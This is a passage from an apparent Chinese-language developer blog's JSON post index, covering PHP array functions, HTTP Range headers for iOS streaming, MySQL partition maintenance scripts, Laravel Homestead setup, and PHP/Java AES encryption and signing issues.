- Stack Overflow](https://stackoverflow.com/questions/30365346/what-is-the-spaceship-operator-in-php-7)\n- [PHP: rfc:combined-comparison-operator](https://wiki.php.net/rfc/combined-comparison-operator)\n\n還有多個欄位排序方法\n\n```php\nfunction order_func($a, $b) {\n    return [$a->x, $a->y, $a->foo] <=> [$b->x, $b->y, $b->foo];\n}\n// or\nfunction order_func($a, $b) {\n    return ($a->$x <=> $b->x) ?: ($a->y <=> $b->y) ?: ($a->foo <=> $b->foo);\n}\n```\n\n## shuffle\n\n`shuffle ( array &$array ) : bool`\n\n隨機排序陣列函式。\n\n實用!!!\n\n## explode = list()\n\n`explode ( string $delimiter , string $string [, int $limit = PHP_INT_MAX ] ) : array`\n\n```php\n$data = \"foo:*:1023:1000::/home/foo:/bin/sh\";\nlist($user, $pass, $uid, $gid, $gecos, $home, $shell) = explode(\":\", $data);\n```\n\n老實說我不常這樣寫，算是小記\n\n## array_key_exists() vs isset()\n\n```php\n\n<?php\n$search_array = array('first' => null, 'second' => 4);\n\n// returns false\nisset($search_array['first']);\n\n// returns true\narray_key_exists('first', $search_array);\n?>\n\n```\n\n## 其他小記(感想)\n\n最近寫久了，雖然覺得 PHP 處理 array 很方便，但發現都是 function base 程式寫上面不是很方便\n最近剛好看到 Laravel 有 Collection ， 改善我上面說的缺點\n有爬過文章說跟 array 校能差不多!!\n[集合 - Laravel - 為網頁藝術家創造的 PHP 框架](https://laravel.tw/docs/5.2/collections)\n","tags":["array"],"categories":["PHP"]},{"title":"Content-Range 小記","url":"%2Fblog%2F2019%2F06%2F27%2FContent-Range-%E5%B0%8F%E8%A8%98%2F","content":"\n最近做音樂串流， IOS 發生了不能播放音樂問題\n找了很久，看了一下封包\n結果發現一見很怪的事情\n\n<!--more-->\n\nIOS 發送 `Range: bytes=0-1`\n但是 Server 正常回傳\n但 IOS 會無限發送 `Range: bytes=0-1`\n\n- [记一则流媒体传输上的坑 | Wildog](https://wil.dog/2016/09/07/streaming-with-flask/)\n- [iOS h5 点播播放 mp4 视频遇到的坑,ios 的 h5 不能播放视频等 - 简书](https://www.jianshu.com/p/d0dbd3196a8e)\n- [使用 PHP 读取视频流，IOS 系统无法观看的问题解决方法 – Jeffrey Wang 的个人博客](https://blog.wj2015.com/2018/03/10/%E4%BD%BF%E7%94%A8php%E8%AF%BB%E5%8F%96%E8%A7%86%E9%A2%91%E6%B5%81%EF%BC%8Cios%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E8%A7%82%E7%9C%8B%E7%9A%84%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/)\n\n- [Swift HTTPURLResponse 的一个坑 - 简书](https://www.jianshu.com/p/a9360d0ff316)\n- [HTTP/2 约束 Header 大小写 - phantomVK Blog](https://phantomvk.github.io/2018/12/13/HTTP2_Header_lower_case/)\n\n簡單小記\n\nrequest header:\nRange: bytes=0-x\n\nresponse header:\nContent-Length: 0-x/n\n\n[聊一聊 HTTP 的 Range, Content-Range | HappyCoding:)](https://dabing1022.github.io/2016/12/24/%E8%81%8A%E4%B8%80%E8%81%8AHTTP%E7%9A%84Range,%20Content-Range/)\n\n## 延升想法\n\n最近同事串流 CDN 服務\n再想用這種 `Range`用 https 去做 Range 感覺沒有到很方便\n現在很多用 hls(m3u8)方式，可能就不會遇到這種問題 orz\n\n剛打完就剛好看到有人講到[video 标签在 iPhone 手机上不能播放？万能的知乎大神请指引我，实在没办法了 - 知乎](https://www.zhihu.com/question/41818719)\n","tags":["range"],"categories":["HTML"]},{"title":"MySQL Partition 小記","url":"%2Fblog%2F2019%2F06%2F25%2FMySQL-Partition-%E5%B0%8F%E8%A8%98%2F","content":"\n最近接觸一點 Partition\n但這個東西不是很熟悉\n所以小記一些東西(都是網路上找的)\n\n<!--more-->\n\n## 主鍵和 Parition\n\n`1503 - A PRIMARY KEY must include all columns in the table's partitioning function`\n[MYSQL 的分区字段，必须包含在主键字段内 - 王 庆 - 博客园](https://www.cnblogs.com/zhishan/p/3285055.html)\n\n\n**2019-08-26 小記**\n要把 patition 的欄位加到 PRIMARY KEY\n\n> 簡單說說我的看法\n> **partition 用到的欄位要加進去 primary key**\n> 這樣切的 partition 時需要注意\n> 不常用就會忘記\n\n今天，發現用 MySQL 子查詢 partition table\nexplain 發現會吃免一個 partition \n\n```sql\nSELECT \nxxx,\n(SELECT count(1) FROM xxxx WHERE id = a.id) as count\nFROM a\nwhere id = 'xxx'\n```\n\n目前不確定是不是因為 id 為字串關系\n但目前系統查詢還不會很慢\n\n\n[MySQL 之 KEY 分區引發的血案 - 每日頭條](https://kknews.cc/other/mjzoq52.html)\n\n## SQL 查詢 Partition 語法\n\n```sql\nSELECT * FROM information_schema.partitions WHERE TABLE_SCHEMA='your_database' AND TABLE_NAME = 'your_table' AND PARTITION_NAME IS NOT NULL\n```\n\n[Are the MySQL Partitions visible in the EXPLAIN plan of a SELECT....? - Stack Overflow](https://stackoverflow.com/questions/8700613/are-the-mysql-partitions-visible-in-the-explain-plan-of-a-select)\n\n## EXPLAIN 沒有出現 Partition\n\n用`EXPLAIN PARTITIONS`\n\n[Are the MySQL Partitions visible in the EXPLAIN plan of a SELECT....? - Stack Overflow](https://stackoverflow.com/questions/8700613/are-the-mysql-partitions-visible-in-the-explain-plan-of-a-select)\n\n[mysql - How to view information of partitions in a table? - Stack Overflow](https://stackoverflow.com/questions/25508419/how-to-view-information-of-partitions-in-a-table)\n\n## Partition 分配不均的問題\n\n用質數，我也沒有實驗過...\n[MySQL 之 KEY 分區引發的血案 - 每日頭條](https://kknews.cc/other/mjzoq52.html) {% asset_link 2.png 備份圖 %}\n[mysql 中的 key 分区为什么总是一半有数据，一半没有数据？-CSDN 论坛](https://bbs.csdn.net/topics/390857704)\n\n```\n如果設置40，64，128等偶數個分區數（PARTITIONS 64），會導致編號為奇數的分區（p1, p3, p5, p7, ... p2n-1）完全插不進數據；\n如果設置63，121（PARTITIONS 63）這種奇數但非質數個分區數，所有分區都會有數據，但是不均勻；\n如果設置137，31這種質數個分區數（PARTITIONS 137），所有分區都會有數據，並且非常均勻；\n\n\n原文網址：https://kknews.cc/other/mjzoq52.html\n```\n\n## KEY & Hash 差異\n\n[MySQL 分区总结 - iVictor - 博客园](https://www.cnblogs.com/ivictor/p/5033708.html)\n\n看不是很懂，Hash 不能重覆,Key 可以??? 等研究出來再補\n\n## 手建和內建 Partition 差別\n\n> 手工分表 VS 分區表\n> 手工分表的邏輯，找到所有需要更新的分表，然後依次更新，在性能上，與分區表並沒有實質的差別\n> 分區表由 Server 層決定使用哪個分區，手工分表由應用代碼決定使用哪一個分表\n\n[MySQL -- 分区表 | 点滴积累](http://zhongmingmao.me/2019/03/17/mysql-partition-table/) {% asset_link 1.png 備份圖 %}\n\n## UUID 主鍵 vs 流水號 主鍵\n\n[MySQL 使用自增 ID 主键和 UUID 作为主键的优劣比较详细过程（从百万到千万表记录测试） - chuixue24 的博客 - CSDN 博客](https://blog.csdn.net/chuixue24/article/details/90449075)\n\n## 不是每張表適合做 Partition\n\n也看 SQL 語句，通常要看所有 WHERE 條件資料依照做切割\n\n## 刪除 Partition 會有資料消失??!\n\nphpmyadmin 可以做刪除動作!!但發現會有少資料\n\n解決方法\n\n```SQL\nALTER TABLE xxxxxx rename TO old_20170101_xxxxxx;\n\nCREATE TABLE `xxxxxx` (\nooooo\n) ENGINE=InnoDB DEFAULT CHARSET=utf8\n;\n\nINSERT INTO xxxxxx SELECT * FROM old_20170101_xxxxxx;\n```\n\n不過為什麼會少資料還沒有找到原因\n\n\n## 自動建立 Partition \n\n- [通过shell脚本自动增加mysql分区表的分区 - MySQL及其它开源数据库 - ITPUB论坛－中国专业的IT技术社区](http://www.itpub.net/thread-1417474-1-1.html)\n\n<details>\n  <summary>本文備份</summary>\n```\n#!/bin/sh\n#\n#\n:<<BLOCK\n######################################################################\nSHELL_NAME：Logdb_Add_Partition.sh\n  Functional Description：At the last month auto add the logdb table partition\n    Argument：\n\n            $1 USER Mysql Account\n            $2 PASS Mysql Account Pass\n            $3 DB        Mysql Logdb\n    Version：V1.0\n    Creater : SongYunkui\n              Colin_Song\n    Crete_time：2010/12/9\n    Modify：1. MODIFY BY\n            2. ADD BY ____ ___/__/__ Add:_________\n######################################################################            \nBLOCK\n\n#######################################################################################\nif [ $# -lt 3 ]; then\n  echo \"Please Input The Correct Args\"\n  echo \"Usage Logdb_Add_Partition.sh <USER> <PASS> <DB>\"\n  exit -1\nfi\n\nUSER=$1\nPASS=$2\nDB=$3\n\n##config section begin\nCONN_MYSQL=\"-u$USER -p$PASS -s\"\nMYSQL_HOME=/opt/modules/mysql\nMYSQL_DIR=${MYSQL_HOME}/bin/mysql\nSHELL_BASE=/opt/sbin/Logdb\nLOG_DIR=${SHELL_BASE}/log\nOPT_NAME=add_partition\n\nMKDIR=`whereis -b mkdir|awk '{print $2}'`\nTOUCH=`whereis -b touch|awk '{print $2}'`\nDATE=`whereis -b date|awk '{print $2}'`\nif [ ! -d ${SHELL_BASE} ]\nthen\n    ${MKDIR} -p ${SHELL_BASE}\nfi\n\nif [ ! -d ${LOG_DIR} ]\nthen\n    ${MKDIR} -p ${LOG_DIR}\nfi\n\nif [ ! -d ${INI_DIR} ]\nthen\n    ${MKDIR} -p ${INI_DIR}\nfi\n\nLOG_FILE=${LOG_DIR}/${OPT_NAME}.log\n\n#config section end\n\n#working start\nCURRENT_DATE=`${DATE} +'%Y-%m-%d'`\necho \"${CURRENT_DATE} everything is ok, runing start\" >> ${LOG_FILE}\n\n#loop read the partition table and column\nwhile read TAB_NAME COL_NAME\ndo\n\nCOUNTER=1\nCURRENT_YEAR=`date +%Y`\n#check the next month\nNEXT_MONTH=`date -d next-month +%m`\n\n#check the next month has many days\ncase ${NEXT_MONTH} in\n            1|01|3|03|5|05|7|07|8|08|10|12)\n                                           CURRENT_DAY=31\n            ;;\n            4|04|6|06|9|09|11)\n                              CURRENT_DAY=30\n            ;;\n            2|02)\n                if [ `expr ${CURRENT_YEAR} % 4` -eq 0 ]; then\n                        if [ `expr ${CURRENT_YEAR} % 400` -eq 0 ]; then\n                                CURRENT_DAY=29\n                        elif [ `expr ${CURRENT_YEAR} % 100` -eq 0 ]; then\n                                CURRENT_DAY=28\n                        else\n                                CURRENT_DAY=29\n                        fi\n                else\n                        CURRENT_DAY=28\n                fi\n             ;;\nesac\n\n#work start add the every day partition\nwhile [ ${COUNTER} -le ${CURRENT_DAY} ]\n\ndo\n\n#calculate the current day's next {counter} day\nPATNAME_DATE=`date -d \"${COUNTER} days\" +%Y%m%d`\nCOUNTER=`expr ${COUNTER} + 1`\nPAT_DATE=`date -d \"${COUNTER} days\" +%Y%m%d`\n\n#change the unix_timestamp\nPAT_UNIX_TIMESTAMP=`${MYSQL_DIR} ${CONN_MYSQL} <<EOF\nuse ${DB};\nselect UNIX_TIMESTAMP('${PAT_DATE}');\nEOF`\n\n##add partition sql\nV_SQL=\"ALTER TABLE ${DB}.\"${TAB_NAME}\" ADD PARTITION (PARTITION P\"${PATNAME_DATE}\" VALUES LESS THAN (\"${PAT_UNIX_TIMESTAMP}\"));\"\necho $V_SQL\n\n#exec the sql\n${MYSQL_DIR} ${CONN_MYSQL} <<EOF\nuse ${DB};\n$V_SQL;\nEOF\n\ndone\ndone<./Logdb_Partition.ini\n\n#working end\nEND_DATE=`${DATE} +'%Y-%m-%d %H:%M:%S'`\necho \"${END_DATE} runing finished\" >> ${LOG_FILE}\necho -e \"\\n--------------------------------------------------------------------\" >> ${LOG_FILE}\n\n```\n</details>\n\n- [Partition maintainance script for Mysql – Database Administration Blog](https://www.dbavalley.com/partition-maintainance-script-for-mysql/)\n- [mysql 能不能自动按日期分区（3个月如果手写要写90个partition） - OSCHINA](https://www.oschina.net/question/146658_55659)\n\n\n<details>\n  <summary>本文備份</summary>\n```\n MYSQL-- 每半月一个分区，自动维护\n\n分类： Mysql/postgreSQL\n\n2010-11-09 15:52:12\n\n建表语句\n \n\ndrop table if exists terminal_parameter;\nCREATE TABLE `terminal_parameter` (\n  `terminal_parameter_id` int(11) NOT NULL AUTO_INCREMENT,\n  `serial` int(11) DEFAULT NULL,\n  `network_type` char(1) DEFAULT NULL,\n  `mcc` int(8) DEFAULT NULL,\n  `mnc` int(8) DEFAULT NULL,\n  `lac` int(8) DEFAULT NULL,\n  `cellid` int(8) DEFAULT NULL,\n  `bsic_psc` int(8) DEFAULT NULL,\n  `ta_ec_io` int(8) DEFAULT NULL,\n  `bcch_rxlev_rscp` int(8) DEFAULT NULL,\n  `arfcn_uarfcn` int(8) DEFAULT NULL,\n  `rxq` int(8) DEFAULT NULL,\n  `c1` int(8) DEFAULT NULL,\n  `c2` int(8) DEFAULT NULL,\n  `signal_intensity` int(8) DEFAULT NULL,\n  `error_rate` int(8) DEFAULT NULL,\n  `alarm_type` varchar(16) DEFAULT NULL,\n  `txpower` int(8) DEFAULT NULL,\n  `small_running_number` int(8) DEFAULT NULL,\n  `createtime` datetime NOT NULL,\n  `userid` int(8) NOT NULL,\n  `terminal_id` int(8) DEFAULT NULL,\n  `state` char(1) DEFAULT '0',\n  `order_definition_id` int(8) DEFAULT NULL,\n  `order_code` varchar(20) DEFAULT NULL,\n  `charg_voltage` float(8,2) DEFAULT NULL,\n  `battery_voltage` float(8,2) DEFAULT NULL,\n  `temprad` float(8,2) DEFAULT NULL,\n  `run_state` int(8) DEFAULT NULL,\n  `switching_value1` int(8) DEFAULT NULL,\n  `switching_value2` int(8) DEFAULT NULL,\n  `bcch_freq` int(8) DEFAULT NULL,\n  `rxlev` int(8) DEFAULT NULL,\n  `rxlev_full` int(8) DEFAULT NULL,\n  `rxlev_sub` int(8) DEFAULT NULL,\n  `rxqual` int(8) DEFAULT NULL,\n  `rxqual_full` int(8) DEFAULT NULL,\n  `rxqual_sub` int(8) DEFAULT NULL,\n  `idle_ts` int(8) DEFAULT NULL,\n  `timing_advance` int(8) DEFAULT NULL,\n  `tch_efr_out` int(8) DEFAULT NULL,\n  `tch_efr_in` int(8) DEFAULT NULL,\n  `dtx` int(8) DEFAULT NULL,\n  `major_cycle_frequency` int(8) DEFAULT NULL,\n  PRIMARY KEY (`terminal_parameter_id`,`createtime`),\n  KEY `idx_createtime` (`createtime`),\n  KEY `idx_terminal_id` (`terminal_id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8\nPARTITION BY RANGE(TO_DAYS (createtime))\n(\nPARTITION p20101115 VALUES LESS THAN (TO_DAYS('2010-11-15')),\nPARTITION p20101130 VALUES LESS THAN (TO_DAYS('2010-11-30')),\nPARTITION p20101215 VALUES LESS THAN (TO_DAYS('2010-12-15')),\nPARTITION p20101231 VALUES LESS THAN (TO_DAYS('2010-12-31')),\nPARTITION p20110115 VALUES LESS THAN (TO_DAYS('2011-01-15')),\nPARTITION p20110131 VALUES LESS THAN (TO_DAYS('2011-01-31')),\nPARTITION p20110215 VALUES LESS THAN (TO_DAYS('2011-02-15')),\nPARTITION p20110228 VALUES LESS THAN (TO_DAYS('2011-02-28')),\nPARTITION p20110315 VALUES LESS THAN (TO_DAYS('2011-03-15')),\nPARTITION p20110331 VALUES LESS THAN (TO_DAYS('2011-03-31')),\nPARTITION p20110415 VALUES LESS THAN (TO_DAYS('2011-04-15')),\nPARTITION p20110430 VALUES LESS THAN (TO_DAYS('2011-04-30'))\n);\n\n\n存储过程代码：\n\n \n\n* 每隔15天执行一次\n/* 程序功能：循环使用分区，每半个月一个分区，保留6个月的数据\n 时间：2010-11-09 */\n drop procedure if exists Set_Partition;\n create procedure Set_Partition()\n begin\n/* 事务回滚，其实放这里没什么作用，ALTER TABLE是隐式提交，回滚不了的。*/\n    declare exit handler for sqlexception rollback;\n    start TRANSACTION;\n \n/* 到系统表查出这个表的最大分区，得到最大分区的日期。在创建分区的时候，名称就以日期格式存放，方便后面维护 */\n    select REPLACE(partition_name,'p','') into @P12_Name from INFORMATION_SCHEMA.PARTITIONS where TABLE_SCHEMA='mydb_1' and table_name='terminal_parameter' order by partition_ordinal_position DESC limit 1;\n\n/* 判断最大分区的时间段，如果是前半个月的，那么根据情况需要加13,14,15,16天\n   如果是后半个月的，那么直接加15天。 +0 是为了把日期都格式化成YYYYMMDD这样的格式*/\n    IF (DAY(@P12_Name)<=15) THEN\n       CASE day(LAST_DAY(@P12_name))\n          WHEN 31 THEN set @Max_date= date(DATE_ADD(@P12_Name+0,INTERVAL 16 DAY))+0 ;\n          WHEN 30 THEN set @Max_date= date(DATE_ADD(@P12_Name+0,INTERVAL 15 DAY))+0 ;\n          WHEN 29 THEN set @Max_date= date(DATE_ADD(@P12_Name+0,INTERVAL 14 DAY))+0 ;\n          WHEN 28 THEN set @Max_date= date(DATE_ADD(@P12_Name+0,INTERVAL 13 DAY))+0 ;\n       END CASE;\n    ELSE\n       set @Max_date= date(DATE_ADD(@P12_Name+0, INTERVAL 15 DAY))+0;\n    END IF;\n\n/* 修改表，在最大分区的后面增加一个分区，时间范围加半个月 */\n    SET @s1=concat('ALTER TABLE terminal_parameter ADD PARTITION (PARTITION p',@Max_date,' VALUES LESS THAN (TO_DAYS (''',date(@Max_date),''')))');\n    PREPARE stmt2 FROM @s1;\n    EXECUTE stmt2;\n    DEALLOCATE PREPARE stmt2;\n\n/* 取出最小的分区的名称，并删除掉 。\n    注意：删除分区会同时删除分区内的数据，慎重 */\n    select partition_name into @P0_Name from INFORMATION_SCHEMA.PARTITIONS where TABLE_SCHEMA='mydb_1' and table_name='terminal_parameter' order by partition_ordinal_position limit 1;\n    SET @s=concat('ALTER TABLE terminal_parameter DROP PARTITION ',@P0_Name);\n    PREPARE stmt1 FROM @s;\n    EXECUTE stmt1;\n    DEALLOCATE PREPARE stmt1;\n\n/* 提交 */\n    COMMIT ;\n end;\n \n\n\n计划任务代码：\n\n \n\nCREATE EVENT e_Set_Partition\n          ON SCHEDULE\n          EVERY 15 day STARTS '2011-04-30 23:59:59'\n          DO\n          call Set_Partition();\n```\n\n</details>\n\n- [MYSQL-- 每半月一个分区，自动维护-909413335-ChinaUnix博客](http://blog.chinaunix.net/uid-24086995-id-127389.html)\n- [Partition maintainance script for Mysql – Database Administration Blog](https://www.dbavalley.com/partition-maintainance-script-for-mysql/)\n\n\n其他連結:\n* [Partition maintainance script for Mysql – Database Administration Blog](https://www.dbavalley.com/partition-maintainance-script-for-mysql/)\n* [MySQL partition table 初體驗 @ 不大會寫程式 :: 隨意窩 Xuite日誌](https://blog.xuite.net/misgarlic/weblogic/314570030-MySQL+partition+table+%E5%88%9D%E9%AB%94%E9%A9%97)\n* [XYZ的筆記本: MySQL 資料表分區(partition)](https://xyz.cinc.biz/2015/07/mysql-partition.html)\n* [What's MySQL partition](http://blog.kenyang.net/2017/06/11/whats-mysql-partition)\n* [mysql 能不能自动按日期分区（3个月如果手写要写90个partition） - OSCHINA](https://www.oschina.net/question/146658_55659)\n* [mysql - ERROR 1526 (HY000): Table has no partition for value 1426566990 - Stack Overflow](https://stackoverflow.com/questions/29694539/error-1526-hy000-table-has-no-partition-for-value-1426566990/29695312)\n* [Mysql - 如何修改 partition 並還原資料 - Luka’s notes](https://codingluka.com/modify-and-restore-mysql-partition/)\n* [MySQL Partition and InnoDB - CornelTEK - Medium](https://medium.com/corneltek/mysql-partition-and-innodb-c2b5982e3c04)\n* [[高并发问题] MySQL 分区的情况下不能使用自增 ID，若使用 UUID 与时间做联合主键，数据量特大时，查询库效率如何？ | Laravel China 社区](https://learnku.com/laravel/t/6566/high-concurrence-problem-cant-use-self-increasing-id-when-mysql-partition-is-used-if-uuid-and-time-are-combined-with-primary-keys-how-effective-is-the-query-pool-when-the-amount-of-data-is-large)\n* [mysql 的 partition与key的关系、限制 - barfoo的专栏 - CSDN博客](https://blog.csdn.net/barfoo/article/details/4242863)\n* [聊聊partition的方式 - code-craft - SegmentFault 思否](https://segmentfault.com/a/1190000011704687)\n* [MySQL Partitioning a VARCHAR(60) - Stack Overflow](https://stackoverflow.com/questions/47423873/mysql-partitioning-a-varchar60)\n* [［MySQL］MySQL分区与传统的分库分表 - 海天的笔记本 | haitian-coder](http://haitian299.github.io/2016/05/26/mysql-partitioning/)\n* [MySQL partition 筆記 - Kakashi's Blog](https://kkc.github.io/2017/07/07/mysql-partitioning/)","tags":["partition"],"categories":["MySQL"]},{"title":"Homestead 架設 Laravel 環境小記","url":"%2Fblog%2F2019%2F06%2F16%2FHomestead-%E6%9E%B6%E8%A8%AD-Laravel-%E7%92%B0%E5%A2%83%E5%B0%8F%E8%A8%98%2F","content":"\n小記 Homestead 使用方法\n\n<!--more-->\n\n## 前言\n\n使用 Homestead 簡單來說就是不用再本機安裝 laravel, composer 等指令\n也能建立 project\n所以把要建立新的專案，先做 homestead.yaml 設定\n進去 vagrant ssh \n可以在該資料夾下，下 laravel , composer 等等指令\n\n## 安裝 vagrant 和 Virtualbox\n\n參考:[第 15 天：以 Vagrant 建置 PHP/Laravel 開發環境 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10193858)\n\n### VirtualBox\n\n安裝可以直接`apt install virtualbox`\n但這邊網路上是直接抓 deb\n\n```bash\nsudo apt install ./virtualbox-5.2_5.2.4-119785~Ubuntu~xenial_amd64.deb\n```\n\n### vagrant\n\n去官網抓 deb\n\n```bash\nsudo apt install ./vagrant_2.0.1_x86_64.deb\n```\n\n我有用 rubygem 安裝\n但就是不能用，用 deb 安裝會比較順利\n\n## 安裝 Homestead\n\n```bash\nvagrant box add laravel/homestead\n```\n\n## Homestead 設定工具\n\n```bash\ngit clone https://github.com/laravel/homestead.git Homestead\n// 可以用 git tag 和有哪些版本\ngit checkout v8.5.1\n```\n\n首先說一下，沒設定 ssh 金鑰要先執行\n`ssh-keygen -t rsa -b 4096 -C \"{您的 Email}\"` 指令產生金鑰。\n是為了`vagrant ssh`用的\n\n更詳細設定\n[第 15 天：以 Vagrant 建置 PHP/Laravel 開發環境 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10193858)\n\n## 修改 Homestead.yaml\n\n首先，在 homestead 目錄執行`bash init.sh`\n設定 Homestead.yaml\n\n```yaml\n---\nip: \"192.168.10.10\"\nmemory: 2048\ncpus: 2\nprovider: virtualbox\n\nauthorize: ~/.ssh/id_rsa.pub\n\nkeys:\n  - ~/.ssh/id_rsa\n\nfolders:\n  - map: ~/quickstart2\n    to: /home/vagrant/code\n\nsites:\n  - map: homestead.test\n    to: /home/vagrant/code/public\n\ndatabases:\n  - homestead\n# ports:\n#     - send: 50000\n#       to: 5000\n#     - send: 7777\n#       to: 777\n#       protocol: udp\n```\n\n主要設定有 folders\n要把 map 設定自己程式路徑\nto 不需要調整\n\n有更多安裝可以看官網文件\n[Laravel Homestead - Laravel - The PHP Framework For Web Artisans](https://laravel.com/docs/5.8/homestead#installing-elasticsearch)\n\n執行 Homestead\n`vagrant ssh`\n\n再做\n\n```\ncomposer install\nphp artisan migrate\n```\n\n這時候自己的`http://localhost:8000`\n可以看到東西\n\n## 一些 homestead.yml 設定\n\n```yml\ndatabases:\n  - homestead\n  - test1\n```\n\nvagrant 執行的時候會建立 databases\n算是滿方便的功能\n\n帳號/密碼\nuser: homestead\npass: secret\n\n[Laravel5.1/Homestead (0.2.7) 开发环境的部署和设置 | Laravel China 社区](https://learnku.com/laravel/t/1245/laravel51homestead-027-development-environment-deployment-and-settings)\n[Laravel Homestead：所有配置详解 | Laravel China 社区](https://learnku.com/laravel/wikis/25530)\n[Laravel Homestead：设置 Cron 计划任务 | Laravel China 社区](https://learnku.com/laravel/wikis/25541)\n\n簡單完成 Laravel Task 架設\n[laravel/quickstart-basic at 0f8346968b2121edf4ac70bf0183821a87929b19](https://github.com/laravel/quickstart-basic/tree/0f8346968b2121edf4ac70bf0183821a87929b19)\n[中级任务清单 |《Laravel 5.1 中文文档》| Laravel China 社区](https://learnku.com/docs/laravel/5.1/quickstart-intermediate/1049)\n\n[Laravel Cron 定时任务 “跳坑” 点 | Laravel China 社区](https://learnku.com/articles/18697)\n\n\n**2019-10-29**\n\n## Homestead 設定多個 Project 方法\n\n其實這篇沒有做 host 動作\n直接 127.0.0.1 就可以連到 Laravel Project\n但一個 VM 跑一個 Project 感覺不是很夠用\n\n但這個只能手動加入/etc/hosts\n\n```\nfolders:\n    - map: ~/laravel-webpaste\n      to: /home/vagrant/code\n    - map: ~/quickstart2\n      to: /home/vagrant/code2\n\n\nsites:\n    - map: homestead.test\n      to: /home/vagrant/code/public\n    - map: homestead.test2\n      to: /home/vagrant/code2/public\n```\n\nfolders 設定程式掛載路徑\n\nsites 設定 hosts 網域路徑\n\n`vagrant reload --provision` 會重啟 VM 跑設定\n\n這時候再設定本機(非VM)`/etc/host`\n\n```\n192.168.10.10 homestead.test\n192.168.10.10 homestead.test2\n```\n\n開瀏覽器輸入兩個網址就能打開\nhttp://homestead.test\nhttp://homestead.test2\n\n有沒有自動設定 host 方法呢?\n\n## Vagrant 設定 hosts 自動化方法\n\n[解放雙手 hosts 自動化 (Vagrant-hostsupdater) | Laravel China 社區](https://learnku.com/articles/16186/homestead-hosts-file-automation-vagrant-hostsupdater-and)\n[【Homestead Master 08】还在手动修改hosts文件？-pilishen.com,做全球最好的实战教程](https://www.pilishen.com/posts/setting-hosts-file-automatically-through-host-updater)\n\n\n非常簡單，兩個步驟\n\n1.  vagrant plugin install vagrant-hostsupdater\n\n2.  vagrant reload --provision\n\n可以查看 `/etc/hosts` 會自動添加 hosts 資料\n\n題外話\n~~目前好奇 `vagrant reload --provision` 一般 user 下執行~~\n~~竟然可以改變 root 644 `/etc/hosts` 檔案~~\n~~有空再研究分析~~\n原來之前下過 sudo \n所以剛剛執行沒有跳出來\nvagrant reload --provision\n會跳出打 root 密碼","tags":["vagrant"],"categories":["Laravel"]},{"title":"PHP 用 AES 加密解密結果作簽章不一樣 (PKCS) & 一些加密雜記","url":"%2Fblog%2F2019%2F06%2F15%2FPHP-%E7%94%A8-AES-%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%B5%90%E6%9E%9C%E4%BD%9C%E7%B0%BD%E7%AB%A0%E4%B8%8D%E4%B8%80%E6%A8%A3-PKCS-%E4%B8%80%E4%BA%9B%E5%8A%A0%E5%AF%86%E9%9B%9C%E8%A8%98%2F","content":"\n最近同事搞不定 PHP7 AES 加密\n由於我們從 PHP5 升級到 PHP7\n我們換成 openssl 但是到 Android APP 解憑證的時候竟然驗證結果會不一樣??\n被同事抓去救火(同事也處理不行 XD)\n然後不熟加密原理的我\n第一件事情就是去 github 上面找 [ChaoLiFL/PHP-Java-AES-Encrypt-Decrypt: Pass data AES encrypted between PHP 5.x, PHP 7.1, PHP 7.2 and Java. Support two ways of encryption and decryption: Base64, Hexadecimal.](https://github.com/ChaoLiFL/PHP-Java-AES-Encrypt-Decrypt)\n沒想到剛好可以用!!! (運氣好)\n不過還是卡在 簽章 結果會不一樣\n\n<!--more-->\n\n## AES 一些加密範例\n\n今天又找了幾個 AES 加密\n\n- [lyhiving/aes: 兼容 php、js、JAVA 的 AES 加密](https://github.com/lyhiving/aes)\n- [pkuoliver/EasyAES: AES encrypt/decrypt, Android, iOS, php compatible(兼容 php, Android, iOS 平台)](https://github.com/pkuoliver/EasyAES)\n- [simplephp/php-java-AES-128-ECB: PHP && JAVA AES/ECB/PKCS5Padding 相互加解密](https://github.com/simplephp/php-java-AES-128-ECB)\n- [stevenholder/PHP-Java-AES-Encrypt: Pass data AES encrypted between PHP and Java.](https://github.com/stevenholder/PHP-Java-AES-Encrypt)\n\n## 當日狀況\n\n首先紀錄，先整理那天的狀態\n原本我同事會先做 簽章 → AES 加密\n他們做簽章 check 都通過\n但是到 AES 一直失敗\n後來他們使用 openssl 一直試 AES\n我用了 [ChaoLiFL/PHP-Java-AES-Encrypt-Decrypt: Pass data AES encrypted between PHP 5.x, PHP 7.1, PHP 7.2 and Java. Support two ways of encryption and decryption: Base64, Hexadecimal.](https://github.com/ChaoLiFL/PHP-Java-AES-Encrypt-Decrypt) 可以用了\n(但可能沒有注意 console 後面有空白)\n魔鬼總是藏在細節!!\n\n後來套用我那個加密，發現 APP 做簽章反查竟然不正確??\n這時候我同事發現後面有空白!!!\n原因是這個導致最簽章反查導致不正確\n但是 PHP 內容印出來也不正確\n\n## 簽章\n\n首先講一下，我目前認知簽章是怕內容有被串改\n所以正常近來如如內容 array 會改他做 `json_encode`\n在做 base64_url_encode(內容)\n會做 hash_hmac [PHP: hash_hmac - Manual](https://www.php.net/manual/en/function.hash-hmac.php)\n\n- [php 中使用 hash_hmac 函数实现 HMAC-SHA1 签名算法的来龙去脉 - dengjiexian123 的专栏 - CSDN 博客](https://blog.csdn.net/dengjiexian123/article/details/53313913)\n- [加密和雜湊有什麼不一樣？ | Just for noting](https://blog.m157q.tw/posts/2017/12/25/differences-between-encryption-and-hashing/)\n- [Code Sign - 程式碼數位簽章](https://gist.github.com/frankyueh/3d5d45236339ff0097a7)\n- [TIPS-用 URL 傳送 Base64 編碼-黑暗執行緒](https://blog.darkthread.net/blog/base64-in-querystring/)\n\n這時候還會做 base64 url encode(簽章)\n\n> why 用 base64 url encode ?\n> http://xxxx/?token=xxxxxxx\n> 這時候不做 base64 url encode，可能就會有問題\n\n~~這之間可能可以去換一些符號~~ (+/改為\\*-或.\\_) 如上補充 url 不能放+/\n\n- [PHP 處理 Base64 URL 的編碼、解碼方式 | Tsung's Blog](https://blog.longwin.com.tw/2018/12/php-base64-url-encode-decode-2018/)\n- [JSON Web Token 入门教程 - 阮一峰的网络日志](http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html)\n\n裡面也有提到 base64 url 